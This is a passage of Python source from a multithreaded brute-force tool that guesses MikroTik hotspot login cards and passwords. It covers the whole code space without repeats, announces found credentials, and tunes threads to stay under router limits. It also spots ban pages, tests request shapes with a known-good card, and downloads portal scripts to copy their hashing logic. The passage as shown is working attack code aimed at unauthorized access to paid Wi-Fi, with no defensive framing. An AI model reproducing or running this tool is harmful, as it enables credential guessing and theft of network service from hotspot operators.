    if capped:
        print(f''' {yellow}! The whole space is only {fmt_int(space)} combos - the round
   was limited to {fmt_int(effective)} attempts to cover all of them without
   repeats (extra attempts would have repeated the same cards).{white}''')
    if space <= 10 ** 6:
        print(f' {green}* This round covers '
              f'{min(100.0, effective / max(space - start_pos, 1) * 100):.1f}% '
              f'of the remaining combos - with zero repeats.{white}')

    t0 = time.time()
    task_q = queue.Queue(maxsize=max(10, threads_count * 2))

    workers = [threading.Thread(target=worker, daemon=True)
               for _ in range(threads_count)]
    for w in workers:
        w.start()

    g = gen()
    sent = 0
    try:
        while sent < effective and not stop_event.is_set():
            u, pw = next(g)
            task_q.put((u, pw))
            sent += 1
    except KeyboardInterrupt:
        stop_event.set()
        print(f'\n {yellow}* Stopped by user.{white}')
    finally:
        try:
            task_q.join()
        except KeyboardInterrupt:
            stop_event.set()
        stop_event.set()
    if mode == '2':
        shared['sent'] = max(len(tried) - shared['tried_start'], 0)
        shared['covered_total'] = len(tried)
        shared['walk'] = None
    else:
        walk['pos'] = min(start_pos + sent, space)
        shared['sent'] = sent
        shared['walk'] = walk
        shared['covered_total'] = min(start_pos + sent, space)
    shared['elapsed'] = time.time() - t0
    print()
    return shared

def print_error_report(shared, threads_count):
    tested = max(shared['tested'], 1)
    errs = shared['errors']
    rate = errs / tested * 100.0
    kinds = shared['error_kinds']

    print(f'{gray} ---------------------------------------------{white}')
    print(f' {cyan}ERROR BREAKDOWN{white}  '
          f'({errs} of {shared["tested"]} = {rate:.1f}%)')

    if not errs:
        print(f' {green}* No connection errors at all.{white}')
    else:
        for kind, n in kinds.most_common():
            share = n / errs * 100.0
            print(f'   {yellow}{kind:<16}{white} {n:>7}  ({share:4.1f}%)  '
                  f'{gray}{ERROR_HINTS.get(kind, "")}{white}')

    if shared['retried']:
        print(f' {green}> {shared["retried"]} stale connections were '
              f'auto-retried (would have been counted as errors in v3.0).{white}')
    if shared.get('requeued'):
        print(f' {green}> {shared["requeued"]} cards failed at network level and '
              f'were re-sent so coverage is not inflated.{white}')

    if shared['http_status']:
        codes = ', '.join(f'{c}x{n}' for c, n
                          in shared['http_status'].most_common(6))
        print(f' {gray}HTTP status codes seen: {codes}{white}')

    lat = shared['latencies']
    if lat:
        lat_sorted = sorted(lat)
        avg = sum(lat) / len(lat)
        p95 = lat_sorted[min(len(lat_sorted) - 1, int(len(lat_sorted) * 0.95))]
        print(f' {gray}Latency: avg {avg:.0f} ms | p95 {p95} ms | '
              f'max {lat_sorted[-1]} ms{white}')

    print(f'\n {cyan}VERDICT{white}')
    if shared['unreachable']:
        topk = ''
        if kinds:
            topk = kinds.most_common(1)[0][0]
        if topk in ('read_timeout', 'connect_timeout', 'conn_timeout', 'timeout'):
            why = (f'the target stopped answering completely '
                   f'({shared.get("unreachable_reason", "")}). '
                   f'all errors were timeouts -> either the link dropped, or the '
                   f'router can no longer keep up with {threads_count} threads.')
        else:
            why = (f'the target stopped answering completely '
                   f'({shared.get("unreachable_reason", "")}). '
                   f'the network/router is no longer visible - you left the wifi '
                   f'range, or a firewall rule is dropping your device.')
        print(f''' {red}* The target stopped answering - the run was aborted.
   last error: {shared["unreachable_kind"]}  |  {shared["err_since_resp"]} consecutive errors
   {why}
   This is not an expired card and not a wrong password. Check: are you still
   on the same network? Then re-measure from the diagnostics before guessing.{white}''')
    elif rate >= 60 and shared['responses'] == 0:
        print(f''' {red}* Not a single HTTP response was received.
   Every request failed at the connection level. Check the URL first,
   not the cards.{white}''')
    elif kinds and kinds.most_common(1)[0][1] / max(errs, 1) >= 0.5:
        topk = kinds.most_common(1)[0][0]
        if topk in ('stale_keepalive',):
            print(f''' {yellow}* Most errors were stale keep-alive connections.
   The router closes reused connections. The real impact is near zero now
   (they are auto-retried) - but to reduce them: lower Threads to 20-40
   or set Connection: close via a small addition in HEADERS.{white}''')
        elif topk in ('read_timeout', 'conn_timeout', 'timeout'):
            rec = max(4, min(threads_count // 2, 40))
            print(f''' {yellow}* Errors are timeouts -> the router is overloaded.
   {threads_count} threads on a home router = extra pressure, and the result is
   more slowness and errors, not more speed. Try {rec} threads and compare
   (the diagnostics do the comparison automatically).{white}''')
        elif topk in ('conn_reset', 'conn_refused'):
            print(f''' {yellow}* Connections are being reset/refused by the router.
   Usually the HTTP server connection limit inside the MikroTik, or a
   middle device/AP. Try fewer threads + a small gap between requests.{white}''')
        elif topk in ('unreachable', 'dns', 'conn_error'):
            print(f''' {red}* Network-level failures dominate - the network is unstable.
   These errors are not evidence of a MikroTik ban, but evidence that the
   path to the router is unreliable from your device.{white}''')
        else:
            print(f' {yellow}* Top error: {topk}. '
                  f'{ERROR_HINTS.get(topk, "")}{white}')
    elif rate >= 10:
        print(f''' {yellow}* Error rate {rate:.1f}% is high for a healthy hotspot.
   Rule of thumb: under 2% is fine, 2-10% needs fewer threads,
   above 10% means the network or router is under real pressure.{white}''')
    else:
        print(f' {green}* Error rate looks healthy ({rate:.1f}%).{white}')

    if shared['block_warn']:
        print(f' {red}! 403/429/5xx responses appeared repeatedly - '
              f'that is the shape of server-side protection (or a captive '
              f'portal restarting), not of expired cards.{white}')
    if shared['error_kinds'].get('stale_keepalive'):
        print(f' {gray}Note: expired cards / wrong codes produce a NORMAL HTTP '
              f'page ("invalid username or password") and count as tested, '
              f'NOT as errors. So Err:N can never mean "expired cards".{white}')


def show_result(shared, p, threads_count):
    e = int(shared.get('elapsed', 0))
    mins, secs = divmod(e, 60)

    if shared['found']:
        u, pw = shared['user'], shared['pw']
        print(f'''
 {green}+==============================================+
 |        * SUCCESS - FOUND CREDENTIALS         |
 +==============================================+{white}
   {cyan}Target   :{white} {p["login_url"]}''')
        if p['network_type'] == '3':
            print(f'   {cyan}Username :{green} {u}'
                  f'\n   {cyan}Password :{green} {pw}')
        elif p['network_type'] == '2':
            print(f'   {cyan}Card/User+Pass :{green} {u}')
        else:
            print(f'   {cyan}Card/Code :{green} {u}')
        print(f'''   {cyan}Tested   :{white} {shared["tested"]} attempts
   {cyan}Errors   :{white} {shared["errors"]}
   {cyan}Time     :{white} {mins}m {secs}s
''')
    else:
        print(f'''
 {red}+==============================================+
 |        * NOT FOUND                           |
 +==============================================+{white}
   {gray}Tested: {shared["tested"]} | Errors: {shared["errors"]} | Time: {mins}m {secs}s{white}''')

    space = shared.get('space', 0)
    sent = shared.get('sent', shared['tested'])
    covered = shared.get('covered_total', 0)
    pct = (covered / space * 100.0) if space else 0.0
    print(f''' {cyan}COVERAGE{white}
   Full space             : {fmt_int(space) if space else "?"} combos
   Distinct cards tried   : {fmt_int(covered)} (never repeated)
   Total HTTP requests    : {fmt_int(shared["tested"])} (includes network retries)
   Cards never delivered  : {fmt_int(shared.get("failed_cards", 0))} (all retries failed)
   HTTP responses read    : {fmt_int(shared.get("responses", 0))}
   Cumulative coverage    : {fmt_int(covered)} / {fmt_int(space)} = {pct:.3f}%''')
    if shared.get('failed_cards'):
        print(f' {yellow}! {shared["failed_cards"]} cards failed to send 4 times in a row '
              f'and never reached the router - they are not really covered. '
              f'Re-run the round (they will be tried in the next round) or '
              f'lower the Threads to reduce loss.{white}')

    print_error_report(shared, threads_count)

    if not shared['found']:
        if space and pct >= 99.999 and shared.get('failed_cards'):
            print(f'''{yellow} ! Coverage is 100% but {shared["failed_cards"]} cards never
   reached the router - they are not really covered. Re-run the same round
   (it resumes where it stopped and passes over them) before any conclusion.
''')
        elif space and pct >= 99.999 and shared.get('mode') != '2':
            print(f'''{red} +========================================================+
 |  * Every possible combo was tried - one by one          |
 +========================================================+{white}
   {white}Since every possible card was tried and none worked, the problem
   is not the guessing nor the "luck" of the digits. Remaining causes:
     1) the request shape is rejected (password required / POST vs GET / dst-popup)
     2) the router rejects the card itself (expired/not created/device blocked)
     3) success detection is not working (success page has no /status)
   {cyan} -> Run the known-good card verification now: it answers all three
     in 9 requests, if you have one known-good card.
   {gray} No need to repeat the attack on the same space - it would repeat
   the same combos.{white}
''')
        elif space and pct >= 60 and shared.get('mode') != '2':
            print(f'''   {yellow}Coverage {pct:.1f}% - the space is not exhausted yet. Re-run with
   the same settings and it resumes from {fmt_int(covered)} instead of starting
   from zero (it never repeats what it tried). Or request {fmt_int(space - covered)}
   attempts to fully cover the rest.{white}
''')
        else:
            print(f'''   {yellow}Try:{white} more attempts - re-check GET/POST (F12)
        - re-check card length/prefix - teach the success page
        - or verify with a known-good card to confirm the request shape
''')
    input(f'{yellow} Press [Enter] to continue...{white}')

def _shape_send(p, method, user, pw, extras):
    """sends a request in a specific shape without touching the original profile."""
    q = dict(p)
    q['method'] = method
    q['extras'] = extras
    return send_login(q, user, pw, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT))


def _describe_resp(resp, base):
    """details of one request compared to the original login page."""
    url = resp.url or ''
    loc = resp.headers.get('Location') or ''
    html = resp.text or ''
    low = html.lower()
    fail = next((f for f in FAILURE_SIGNS if f in low), None)
    same_path_as_base = bool(base) and same_path(url, base['url'])
    size_same = base is not None and abs(len(html) - base['len']) <= 40
    return {
        'status': getattr(resp, 'status_code', 0),
        'url': url,
        'loc': loc,
        'len': len(html),
        'fail': fail,
        'login_page': same_path_as_base and size_same,
        'status_page': ('/status' in url.lower()) or ('/status' in loc.lower()),
        'text': html,
    }


def verify_flow():
    db = load_db()
    p = choose_profile(db)
    if p is None:
        return
    idx = p.pop('__index__', None)

    print(f'''{cyan}
 +-- Verify with a known-good card -------------+
 | {gray}You have a correct card you know? this screen tries  |{white}
 | {gray}it in 8 request shapes and tells you exactly         |{white}
 | {gray}where the problem is: shape? detection? or the card? |{white}
{cyan} +----------------------------------------------+{white}''')

    good = input(' Known-good card/username : ').strip()
    if not good:
        print(f'{red} * Cancelled.{white}')
        input(f'{gray} Enter to continue...{white}')
        return
    pwx = input(' Password for it (Enter = same as card, "-" = none) : ').strip()
    if pwx == '-':
        pw_list = [None]
    elif pwx == '':
        pw_list = [None, good]
    else:
        pw_list = [pwx]

    print(f'{yellow} > Fetching the plain login page (baseline)...{white}')
    try:
        b = test_connection(p['login_url'])
        base = {'url': b.url or p['login_url'], 'len': len(b.text or '')}
        print(f'{green} * Baseline: HTTP {b.status_code} | {base["len"]} bytes | '
              f'{base["url"]}{white}')
    except Exception as e:
        kind, short = classify_error(e)
        print(f'{red} * Cannot reach the login page [{kind}]: {short}{white}')
        input(f'{gray} Enter to continue...{white}')
        return
    wrong = ''.join(choices('zqx9', k=max(6, len(good))))
    wrong_d = None
    try:
        wresp = _shape_send(p, p.get('method', '1'), wrong, wrong, True)
        wrong_d = _describe_resp(wresp, base)
    except Exception:
        pass
    shapes = []
    for method, mname in (('1', 'GET '), ('2', 'POST')):
        for extra in (True, False):
            tag = '+dst-popup' if extra else 'plain    '
            shapes.append((method, extra, None, f'{mname} {tag} user-only'))
            for v in pw_list:
                if v:
                    shapes.append((method, extra, v,
                                   f'{mname} {tag} user+pass'))

    print(f'\n {cyan}Testing {len(shapes)} request shapes with the '
          f'known-good card...{white}\n')
    print(f' {gray}{"shape":<32} {"HTTP":<5} {"size":<7} verdict{white}')
    print(f' {gray}{"-" * 82}{white}')
    results = []
    for method, extra, pwv, label in shapes:
        try:
            r = _shape_send(p, method, good, pwv, extra)
            d = _describe_resp(r, base)
        except Exception as e:
            kind, _ = classify_error(e)
            d = {'status': 0, 'url': f'[{kind}]', 'len': 0, 'fail': None,
                 'login_page': False, 'status_page': False, 'text': ''}
        d.update(method=method, extra=extra, pwv=pwv, label=label)
        if d['status_page']:
            verdict = 'SUCCESS - redirected to /status'
        elif d['fail']:
            verdict = f'rejected ({d["fail"][:26]})'
        elif d['login_page']:
            verdict = 'login page again (no error text)'
        elif (wrong_d and d['len'] == wrong_d['len']
              and d['url'] == wrong_d['url']):
            verdict = 'identical to wrong-card reply'
        elif d['len'] != base['len']:
            verdict = 'DIFFERENT page - inspect'
        else:
            verdict = 'same size as login page'
        d['verdict'] = verdict
        results.append(d)
        print(f' {white}{label:<32} {d["status"]:<5} {d["len"]:<7} {verdict}{white}')

    print(f'\n {cyan}VERDICT{white}')
    winners = [d for d in results if d['status_page']]
    differs = [d for d in results
               if not d['status_page'] and not d['login_page'] and not d['fail']
               and d['len'] != base['len']]
    rejected_all = all((d['fail'] or d['login_page']) for d in results)

    if winners:
        w = winners[0]
        print(f''' {green}* Correct request shape: {w["label"].strip()}
   The router accepted the card and redirected to /status -> success
   detection works, and your earlier failure was only incomplete digit
   coverage (card repeats) - which v3.2 fixed.{white}''')
    elif differs:
        d = differs[0]
        print(f''' {yellow}* No /status redirect, but the reply to the correct card is
   really different from the login page ({d["len"]} bytes instead of {base["len"]}).
   So the request succeeded and the router returned a success page in a
   different shape (JS/Popup), and your detection does not know it ->
   that is why MATCH FOUND never showed.{white}''')
        print(f' {gray}   final URL: {d["url"]}{white}')
    elif rejected_all:
        print(f''' {red}* All eight shapes rejected the correct card itself.
   This means the problem is not the tool nor the request shape, but one of:
     1) the card is expired or was not created/activated on the router yet
     2) your device is blocked (ip-binding blocked) or the router accepts no new login
     3) the URL is not the correct hotspot login page
   {gray}   Open the login page in a browser and log in with the card manually:
   if it is rejected in the browser too -> the problem is the card/network, not the tool.{white}''')
    else:
        print(f''' {yellow}* The replies show neither clear success nor clear rejection.
   Re-check that the known-good card is typed correctly and that the URL is
   really the login page.{white}''')
    learn_src = winners[0] if winners else (differs[0] if differs else None)
    if learn_src and idx is not None:
        print(f'''\n {cyan}The tool can now learn the success page from this reply
   (instead of relying on /status alone - much more accurate).{white}''')
        if ask_yn(' -> Apply this shape + learn the success page?',
                  default_yes=True):
            prof = db['profiles'][idx]
            prof['method'] = learn_src['method']
            prof['extras'] = learn_src['extra']
            prof['last_used'] = datetime.now().strftime('%Y-%m-%d %H:%M')
            sig = extract_signature(learn_src['text'],
                                    wrong_d['text'] if wrong_d else '')
            if sig:
                prof['success_signature'] = sig
            if learn_src['url']:
                prof['success_url'] = learn_src['url']
            if save_db(db):
                print(f' {green}* Saved: '
                      f'method={"POST" if learn_src["method"] == "2" else "GET"}, '
                      f'extras={learn_src["extra"]}, signature={len(sig)} words'
                      f'{white}')

    input(f'{yellow} Press [Enter] to continue...{white}')

def _probe(p, n, threads_count, label):
    """sends n attempts with wrong data (guesses nothing) and only measures."""
    lock = threading.Lock()
    stop_event = threading.Event()
    stats = {'n': 0, 'err': 0, 'kinds': Counter(), 'codes': Counter(),
             'lat': [], 'retried': 0}

    def one():
        u = ''.join(choices('zqx9', k=10))
        t0 = time.time()
        try:
            r = send_login(p, u, u, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT))
        except Exception as e:
            kind, _ = classify_error(e)
            with lock:
                stats['err'] += 1
                stats['kinds'][kind] += 1
                stats['n'] += 1
            return
        with lock:
            stats['n'] += 1
            stats['lat'].append(round((time.time() - t0) * 1000))
            stats['codes'][r.status_code] += 1
            if getattr(_tls, 'retried', False):
                stats['retried'] += 1

    t0 = time.time()
    if threads_count <= 1:
        for _ in range(n):
            if stop_event.is_set():
                break
            one()
    else:
        q = queue.Queue(maxsize=max(10, threads_count * 2))

        def worker():
            while True:
                try:
                    q.get(timeout=0.25)
                except queue.Empty:
                    return
                try:
                    one()
                finally:
                    q.task_done()

        ws = [threading.Thread(target=worker, daemon=True)
              for _ in range(threads_count)]
        for w in ws:
            w.start()
        for _ in range(n):
            q.put(1)
        q.join()

    el = max(time.time() - t0, 0.001)
    err_rate = stats['err'] / max(stats['n'], 1) * 100.0
    avg = sum(stats['lat']) / len(stats['lat']) if stats['lat'] else 0
    print(f'\n {cyan}{label}{white}')
    print(f'   requests {stats["n"]:<6} errors {stats["err"]:<6} '
          f'({err_rate:5.1f}%)   speed {stats["n"] / el:5.1f}/s   '
          f'avg latency {avg:.0f} ms')
    if stats['codes']:
        print(f'   {gray}HTTP: '
              f'{", ".join(f"{c}x{n}" for c, n in stats["codes"].most_common(5))}'
              f'{white}')
    if stats['kinds']:
        print(f'   {yellow}errors: '
              f'{", ".join(f"{k} x{n}" for k, n in stats["kinds"].most_common(5))}'
              f'{white}')
    if stats['retried']:
        print(f'   {green}auto-retried: {stats["retried"]}{white}')
    return stats, err_rate


def _looks_blocked(text):
    """v3.13: recognize the actual ban page. Note: the string
    'blocked.html' also appears inside the portal's checkCookie JS on EVERY
    page, so only explicit ban wording counts."""
    low = (text or '')[:6000].lower()
    return ('you are blocked' in low or 'your ip is blocked' in low
            or 'ip has been blocked' in low or 'access blocked' in low
            or '<title>blocked' in low or 'too many attempts' in low
            or 'too many login attempts' in low)


def _normalize_page(text, extra=()):
    """v3.13: mask the parts of a reply that legitimately change between
    two identical requests (timestamps, uuids, nonces, the echoed
    username/password) so pages can still be compared exactly even when the
    portal renders dynamic values into them."""
    t = text or ''
    for s in extra:
        if s:
            t = t.replace(s, '#')
    t = re.sub(r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-'
               r'[0-9a-fA-F]{4}-[0-9a-fA-F]{12}', '#', t)
    t = re.sub(r'[0-9a-fA-F]{16,}', '#', t)   # long hex/uuid BEFORE digits
    t = re.sub(r'\d{4,}', '#', t)
    return t


def _distinct_words(good_text, bad_text, limit=6):
    """v3.10: words present in the good-card reply but absent from the
    wrong-card reply - ready-made success keyword candidates."""
    gw = set(re.findall(r'[a-zA-Z]{5,}', (good_text or '').lower()))
    bw = set(re.findall(r'[a-zA-Z]{5,}', (bad_text or '').lower()))
    return sorted(gw - bw, key=len, reverse=True)[:limit]


def diagnose_flow():
    db = load_db()
    p = choose_profile(db)
    if p is None:
        return

    print(f'''{cyan}
 +-- Diagnostics (read-only, no guessing) ------+
 | {gray}Sends deliberately wrong data to measure the  |{white}
 | {gray}network state only: latency, errors, HTTP codes|{white}
 | {gray}It tries no card and consumes no attempts.     |{white}
{cyan} +----------------------------------------------+{white}''')

    print(f'{yellow} > Reachability test...{white}')
    t0 = time.time()
    try:
        r = test_connection(p['login_url'])
        print(f'{green} * HTTP {r.status_code} in '
              f'{(time.time() - t0) * 1000:.0f} ms{white}')
    except Exception as e:
        kind, short = classify_error(e)
        print(f'{red} * Unreachable [{kind}]: {short}{white}')
        print(f'{gray}   -> {ERROR_HINTS.get(kind, "")}{white}')
        print(f'{yellow}   No guessing is useful before fixing access to the URL.{white}')
        input(f'{gray} Enter to continue...{white}')
        return

    s1, r1 = _probe(p, 30, 1, 'A) Sequential - 1 thread / 30 requests')

    default_t = int(p.get('threads', 20))
    t = ask_int(f'{white} -> Threads to compare against '
                f'{green}(Enter={default_t}){white} : ',
                default=default_t, minv=1, maxv=100)
    s2, r2 = _probe(p, max(60, t * 3), t,
                    f'B) Parallel - {t} threads / {max(60, t * 3)} requests')

    print(f'\n {cyan}DIAGNOSIS{white}')
    if s1['err'] == 0 and s2['err'] == 0:
        print(f''' {green}* The link is clean at both settings.
   Any errors you see in attack mode are therefore not from the network -
   re-check the URL/method.{white}''')
    elif r2 > r1 * 2 and r2 > 3:
        rec = max(4, min(t // 2, 40))
        print(f''' {yellow}* Errors grow with Threads ({r1:.1f}% -> {r2:.1f}%).
   This is pressure on the router/device, not a ban and not expired cards.
   {t} -> try {rec} threads: the real speed usually does not drop because the
   router is the bottleneck, and errors drop a lot.{white}''')
    elif r1 > 3 and s1['err'] >= 3:
        print(f''' {yellow}* Errors exist even with a single thread
   ({r1:.1f}% = {s1["err"]} of {s1["n"]} requests).
   The suspicion here is the path itself: weak wifi, a middle AP, or the
   router itself under pressure / slow RADIUS. Lowering Threads will not fix it.{white}''')
    elif r1 > 3:
        print(f''' {green}* One or two errors with a single thread
   ({s1["err"]} of {s1["n"]}) = normal noise, no verdict from it.
   Errors appear with parallelism ({r2:.1f}%) -> router pressure, not a ban.{white}''')
    else:
        print(f' {green}* The difference is normal: {r1:.1f}% -> {r2:.1f}%.{white}')

    if s2['kinds'].get('stale_keepalive'):
        print(f' {gray}Note: {s2["kinds"]["stale_keepalive"]} of the errors were '
              f'stale keep-alive connections (auto-retried) - zero impact.{white}')
    input(f'{gray} Enter to continue...{white}')


def choose_profile(db):
    profiles = db['profiles']
    if not profiles:
        print(f'{yellow} ! No saved profiles. Create one first (option 2).{white}')
        input(f'{gray} Enter to continue...{white}')
        return None

    order = sorted(range(len(profiles)),
                   key=lambda i: profiles[i].get('last_used', ''), reverse=True)
    print(f'\n {cyan}Saved networks:{white}')
    for n, i in enumerate(order, 1):
        pr = profiles[i]
        mark = (green + '*' + white if pr.get('success_signature')
                else gray + '-' + white)
        sp = _profile_space(pr) if pr.get('network_type') else 0
        print(f'  {n}) {pr["name"]:<22} {gray}{pr["login_url"]}  '
              f'space:{fmt_int(sp)}  learned:{mark}')
    print(f'  0) back')

    while True:
        c = input(f'{white} -> choose : ').strip()
        if c == '0':
            return None
        if c.isdigit() and 1 <= int(c) <= len(order):
            idx = order[int(c) - 1]
            break
        print(f'{red} * Invalid.{white}')

    p = deepcopy(profiles[idx])
    print_profile_summary(p)

    new = input(f'{white} -> New URL {green}(Enter = keep current){white} : ').strip()
    if new:
        p['login_url'] = normalize_url(new)
    print(f'{yellow} > Testing connection...{white}')
    try:
        r = test_connection(p['login_url'])
        print(f'{green} * Connected! (HTTP {r.status_code}){white}')
    except Exception as e:
        kind, short = classify_error(e)
        print(f'{red} * Cannot reach target [{kind}]: {short}{white}')
        print(f'{gray}   -> {ERROR_HINTS.get(kind, "")}{white}')
        input(f'{gray} Enter to continue...{white}')
        return None
    p['__index__'] = idx
    return p


def _persist_tried(prof, shared):
    """v3.3: store the tried-card set back into the profile (capped)."""
    tried = shared.get('tried')
    if tried is None:
        return False
    lst = list(tried)
    capped = len(lst) > MAX_SAVED_TRIED
    if capped:
        lst = lst[-MAX_SAVED_TRIED:]
    prof['tried_cards'] = lst
    if capped:
        print(f' {yellow}! Tried list capped at {fmt_int(MAX_SAVED_TRIED)} cards '
              f'(oldest entries may repeat after the cap).{white}')
    return True


def use_profile_flow():
    db = load_db()
    p = choose_profile(db)
    if p is None:
        return
    idx = p.pop('__index__')
    profiles = db['profiles']

    mode = p.get('guess_mode', '1')
    if mode == '2':
        space = _profile_space(p)
        tried_n = len(p.get('tried_cards') or [])
        remaining = max(space - tried_n, 0)
    else:
        walk, space, _ = get_walk(p)
        remaining = max(space - int(walk.get('pos', 0)), 0) or space
    dflt = remaining if remaining <= 2_000_000 else None
    hint = f'space {fmt_int(space)}'
    if dflt:
        hint += f', Enter = cover all {fmt_int(dflt)}'
    count = ask_int(f'{white} -> Attempts {green}({hint}){white} : ', default=dflt)

    threads_count = ask_int(f'{white} -> Threads {green}(Enter = saved){white} : ',
                            default=p.get('threads', 20), minv=1, maxv=100)
    if threads_count > 60:
        print(f'{yellow} ! {threads_count} threads on a normal hotspot router = '
              f'more errors and less speed. The diagnostics measure the '
              f'difference before attacking.{white}')
    p['threads'] = threads_count

    if p.get('success_signature') or p.get('success_url'):
        print(f' {green}* Using learned success page automatically.{white}')
        keyword = input(f'{white} -> Extra keyword {green}(Enter = none){white} : ').strip()
    else:
        keyword = input(f'{white} -> Success Keyword {green}(Enter = status){white} : ').strip() or 'status'

    shared = attack(p, count, threads_count, keyword)
    show_result(shared, p, threads_count)
    profiles[idx]['walk'] = p.get('walk')
    profiles[idx]['threads'] = threads_count
    profiles[idx]['last_used'] = datetime.now().strftime('%Y-%m-%d %H:%M')
    if mode == '2':
        _persist_tried(profiles[idx], shared)
    save_db(db)


def create_profile_flow():
    p = {}
    print(f'\n {cyan}-- New Profile --{white}\n')
    if not ask_url_and_test(p):
        return
    ask_method_and_fields(p)
    ask_network_shape(p)
    ask_guess_mode(p)
    p['threads'] = ask_int(f'{white} -> Default threads {green}(Enter=20){white} : ',
                           default=20, minv=1, maxv=100)

    keyword = ''
    if ask_yn(f'{yellow} -> Teach me the SUCCESS page now? '
              f'{gray}(known correct credentials){white}', default_yes=False):
        if learn_success_page(p):
            keyword = ''
    if not keyword and not (p.get('success_signature') or p.get('success_url')):
        keyword = input(f'{white} -> Success Keyword {green}(Enter = status){white} : ').strip() or 'status'
    p['keyword'] = keyword
    sc = input(f'{white} -> Success URL contains {green}(e.g. msftconnecttest.com, Enter=none){white} : ').strip()
    if sc:
        p['success_url_contains'] = sc

    if ask_yn(f'{yellow} -> Run diagnostics before attacking? {gray}(recommended)',
              default_yes=True):
        _probe(p, 30, 1, 'A) Sequential - 1 thread / 30 requests')
        _probe(p, max(60, p['threads'] * 3), p['threads'],
               f'B) Parallel - {p["threads"]} threads')

    db = load_db()
    saved = False
    if ask_yn(f'{yellow} -> Save this profile?', default_yes=True):
        names = {pr['name'] for pr in db['profiles']}
        suggested = urlparse(p['login_url']).netloc or 'network'
        while True:
            name = input(f'{white} -> Profile name {green}(Enter = {suggested}){white} : ').strip() or suggested
            if name not in names:
                break
            print(f'{red} * Name already used, pick another.{white}')
        p['name'] = name
        p['created'] = datetime.now().strftime('%Y-%m-%d %H:%M')
        p['last_used'] = p['created']
        db['profiles'].append(p)
        if save_db(db):
            saved = True
            print(f' {green}* Saved to {os.path.basename(DB_FILE)}{white}')

    mode = p.get('guess_mode', '1')
    if mode == '2':
        space = _profile_space(p)
        tried_n = len(p.get('tried_cards') or [])
        remaining = max(space - tried_n, 0)
    else:
        walk, space, _ = get_walk(p)
        remaining = max(space - int(walk.get('pos', 0)), 0) or space
    dflt = remaining if remaining <= 2_000_000 else None
    hint = f'space {fmt_int(space)}'
    if dflt:
        hint += f', Enter = cover all {fmt_int(dflt)}'
    count = ask_int(f'{white} -> Attempts {green}({hint}){white} : ', default=dflt)
    shared = attack(p, count, p['threads'], keyword)
    show_result(shared, p, p['threads'])
    if saved:
        p['walk'] = shared.get('walk')
        if mode == '2':
            _persist_tried(p, shared)
        save_db(db)


def manage_profiles_flow():
    db = load_db()
    profiles = db['profiles']
    if not profiles:
        print(f'{yellow} ! No saved profiles.{white}')
        input(f'{gray} Enter to continue...{white}')
        return
    print(f'\n {cyan}Saved profiles:{white}')
    for n, pr in enumerate(profiles, 1):
        print(f'  {n}) {pr["name"]:<22} {gray}{pr["login_url"]}{white}')
    print(f'  0) back')
    c = input(f'{white} -> Delete number : ').strip()
    if c.isdigit() and 1 <= int(c) <= len(profiles):
        name = profiles[int(c) - 1]['name']
        if ask_yn(f'{red} -> Delete "{name}"?', default_yes=False):
            profiles.pop(int(c) - 1)
            save_db(db)
            print(f' {green}* Deleted.{white}')
    input(f'{gray} Enter to continue...{white}')

def fetch_scripts_flow():
    """v3.6: download every script the login page loads (md5.js, doLogin...)
    into portal_scripts/ and print where the interesting functions live."""
    print(f'''{cyan}
 +-- Fetch portal scripts ---------------------+
 | {gray}Downloads every <script src=...> and inline   |{white}
 | {gray}<script> block of the login page, saves them  |{white}
 | {gray}to portal_scripts/ and shows where doLogin /  |{white}
 | {gray}md5 / chap logic is defined.                  |{white}
{cyan} +---------------------------------------------+{white}''')
    raw = input(f'{white} -> Login URL {green}(ex: http://t.com/login){white} : ').strip()
    url = normalize_url(raw)
    if not url:
        return
    print(f'{yellow} > Fetching login page...{white}')
    try:
        r = test_connection(url)
    except Exception as e:
        kind, short = classify_error(e)
        print(f'{red} * Cannot reach the page [{kind}]: {short}{white}')
        return
    page_html = r.text or ''
    base = r.url or url
    print(f'{green} * Got the page: HTTP {r.status_code}, {len(page_html)} bytes{white}')

    out_dir = os.path.join(SCRIPT_DIR, 'portal_scripts')
    os.makedirs(out_dir, exist_ok=True)

    srcs = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', page_html, re.I)
    inlines = re.findall(r'<script(?![^>]*src)[^>]*>(.*?)</script>',
                         page_html, re.I | re.S)

    saved = []
    for i, block in enumerate(inlines, 1):
        if block.strip():
            name = f'inline_{i}.js'
            with open(os.path.join(out_dir, name), 'w', encoding='utf-8') as f:
                f.write(block)
            saved.append((name, block))
            print(f' {green}* saved inline script #{i} -> '
                  f'portal_scripts/{name} ({len(block)} bytes){white}')

    for s in srcs:
        full = urljoin(base, s)
        name = re.sub(r'[^A-Za-z0-9._-]', '_', s.split('/')[-1]) or 'script.js'
        try:
            rr = requests.get(full, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
                              verify=False)
            body = rr.text or ''
            with open(os.path.join(out_dir, name), 'w', encoding='utf-8') as f:
                f.write(body)
            saved.append((name, body))
            print(f' {green}* fetched {full} -> portal_scripts/{name} '
                  f'({len(body)} bytes){white}')
        except Exception as e:
            kind, short = classify_error(e)
            print(f' {red}* FAILED {full} [{kind}]: {short}{white}')

    if not saved:
        print(f' {yellow}! No scripts found in the page.{white}')
        return

    print(f'\n {cyan}SEARCHING FOR THE HIDDEN LOGIC...{white}')
    found_any = False
    for name, body in saved:
        low = body.lower()
        for key in ('dologin', 'md5', 'chap', 'challenge', 'hash', 'rem('):
            idx = low.find(key)
            while idx != -1:
                found_any = True
                snippet = body[max(0, idx - 150): idx + 650]
                print(f'\n {yellow}--- {name}: "{key}" at char {idx} ---{white}')
                print(f' {gray}{snippet}{white}')
                idx = low.find(key, idx + len(key))
                break  # one window per key per file is enough
    if not found_any:
        print(f' {yellow}! doLogin/md5/chap not found in the fetched scripts. '
              f'The logic may live in another file - check portal_scripts/ '
              f'and the page source for more <script> tags.{white}')
    print(f'\n {green}* All scripts saved under portal_scripts/ - send those '
          f'files to add the hashing logic to the tool.{white}')
    input(f'{gray} Enter to continue...{white}')


def parse_login_form(html_text, base_url):
    """v3.9: pull the first <form> and its <input> fields out of the login
    page HTML so the tool copies what the browser would really send."""
    info = {'action': base_url, 'method': 'post', 'fields': {},
            'user_field': 'username', 'pass_field': 'password'}
    m = re.search(r'<form\b[^>]*>', html_text, re.I)
    if m:
        tag = m.group(0)
        a = re.search(r'action\s*=\s*["\']([^"\']+)["\']', tag, re.I)
        if a:
            info['action'] = urljoin(base_url, a.group(1))
